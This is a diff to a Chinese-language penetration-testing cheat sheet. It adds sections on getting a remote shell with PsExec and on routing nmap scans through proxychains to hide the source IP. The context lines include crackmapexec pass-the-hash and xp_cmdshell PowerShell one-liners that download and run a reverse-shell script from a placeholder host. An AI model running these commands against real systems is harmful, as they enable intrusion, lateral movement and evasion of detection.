@@ -261,10 +261,14 @@ crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
 
 ```
 
-### 提權
+### 遠程系統獲取 shell
 
-+ PsExec
+>impacket套件內的psexec，執行命令之後會刪除對應的服務，隱蔽性更佳，而且impacket套件內的psexec支持PTH(哈希傳遞)
+
++ [PsExec](https://www.poftut.com/use-psexec-tools-run-commands-get-shell-remote-windows-systems/)
+
 `psexec.exe -s -i cmd.exe`
+
 
 ### [LM，NTLM，Net-NTLMv2](https://book.hacktricks.xyz/windows-hardening/ntlm)
 
@@ -385,5 +389,14 @@ statement to install.
     + `SQL> xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://tun0IP:ncport/rv.ps1\")`
     + `EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(”http://tun0IP:ncport/rev.ps1”) | powershell -noprofile'`
   
+### Proxy
++ [proxychains](https://github.com/haad/proxychains)
+```
+ProxyChains 是一種工具，可通過各種代理（如 SOCKS4、SOCKS5 或 HTTP）重定向應用程序建立的 TCP 連接。ProxyChains 可以將多個代理串在一起，從而更難識別原始 IP 地址。這些鏈通常用於紅隊交戰中，使藍隊隊員很難追踪到原始 IP 地址。在使用 ProxyChains 時，您可以使用 SSH、telnet、wget 和 Nmap 等各種工具來逃避檢測。
 
+將 Nmap 與 ProxyChains 一起使用，合併 Nmap 和 ProxyChains 是一種非常常用的技術，用於在進行滲透測試時將流量路由到內部網絡。這種工具組合有效地允許客戶端環境中的電腦通過 SSH SOCKS5 代理匯集所有 Nmap 的流量。
+
+proxychains nmap -sS <Target’s IP Address>
+
+```
 
